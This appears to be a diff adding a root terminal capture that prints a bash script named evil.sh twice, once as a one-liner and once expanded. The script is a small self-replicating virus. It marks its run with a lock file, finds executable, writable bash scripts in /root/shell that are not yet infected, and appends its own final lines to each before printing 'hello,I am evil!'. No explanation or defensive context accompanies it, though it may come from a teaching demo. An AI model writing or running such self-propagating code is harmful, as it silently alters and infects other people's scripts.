@@ -1,0 +1,17 @@
+[root@server0 tmp]# cat evil.sh
+#!/bin/bash
+[ -e /tmp/.IAmEvil ] && exit ; touch /tmp/.IAmEvil ; for file in `ls /root/shell`;do	grep "IAmEvil" $file &> /dev/null && continue ; file $file | grep "Bourne-Again shell script" &> /dev/null || continue ;[ -x $file -a -w $file ] || continue ;tail -n 1  $0 >> $file ; done;echo "hello,I am evil!";rm -rf /tmp/.IAmEvil
+
+[root@server0 tmp]# cat evil.sh
+#!/bin/bash
+[ -e /tmp/.IAmEvil ] && exit
+touch /tmp/.IAmEvil 
+for file in `ls /root/shell`
+do	
+	grep "IAmEvil" $file &> /dev/null && continue 
+	file $file | grep "Bourne-Again shell script" &> /dev/null || continue 
+	[ -x $file -a -w $file ] || continue 
+	tail -n 11  $0 >> $file 
+done
+echo "hello,I am evil!"
+rm -rf /tmp/.IAmEvil
